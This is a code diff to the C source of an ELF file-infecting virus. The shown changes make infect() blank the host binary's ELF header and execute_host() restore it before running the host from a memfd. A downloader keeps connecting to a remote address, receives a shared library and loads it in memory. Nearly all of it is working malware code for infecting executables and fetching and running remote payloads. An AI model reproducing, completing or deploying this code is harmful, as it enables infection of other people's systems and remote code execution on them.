@@ -74,6 +74,9 @@ void infect(FILE* h, FILE* p){
   char p_buffer[p_size];
   fread(h_buffer, sizeof(char), h_size, h);
   fread(p_buffer, sizeof(char), p_size, p);
+  for(int i = 0; i < 4; ++i){
+    *(h_buffer + i) = 0;
+  }
   fseek(h, 0, SEEK_SET);
   fwrite(p_buffer, sizeof(char), p_size, h);
   fwrite(h_buffer, sizeof(char), h_size, h);
@@ -86,6 +89,10 @@ void execute_host(FILE* f, char** argv, char** envp){
   char host[h_size];
   fseek(f, p_size, SEEK_SET);
   fread(host, sizeof(char), h_size, f);
+  host[0] = ELFMAG0;
+  host[1] = ELFMAG1;
+  host[2] = ELFMAG2;
+  host[3] = ELFMAG3;
   int fd = memfd_create("", 1);
   write(fd, host, h_size);
   pid_t pid;
@@ -99,10 +106,10 @@ void execute_host(FILE* f, char** argv, char** envp){
   }
 }
 
-void load_so(int connection_fd, int size){
+void load_so(int socket_fd, int size){
   char* file_buff = (char*)malloc(sizeof(char)*size);
   int fd = memfd_create("", 1);
-  read(connection_fd, file_buff, sizeof(char)*size);
+  read(socket_fd, file_buff, sizeof(char)*size);
   write(fd, file_buff, size);
   free(file_buff);
   void* handle;
@@ -113,16 +120,16 @@ void load_so(int connection_fd, int size){
   exit(0);
 }
 
-void process_connection(int connection_fd){
+void process_connection(int socket_fd){
   char buff[13];
-  read(connection_fd, buff, sizeof(buff));
+  read(socket_fd, buff, sizeof(buff));
   int size = atoi(buff);
-  load_so(connection_fd, size);
+  load_so(socket_fd, size);
 }
 
 void downloader(){
   int socket_fd;
-  int connection_fd = -1;
+  int connection = -1;
   pid_t pid;
   struct sockaddr_in server;
   
@@ -131,13 +138,16 @@ void downloader(){
   server.sin_port = htons(port);
   server.sin_addr.s_addr = inet_addr(addr);
 
-  while(connection_fd < 0){
+  while(connection < 0){
     sleep(5);
-    connection_fd = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
+    connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
   }
 
-  process_connection(socket_fd);
-    
-  close(connection_fd);
+  if((pid = fork()) == 0){
+    process_connection(socket_fd);
+  }else{
+    wait(NULL);
+  }
+  
   close(socket_fd);
 }
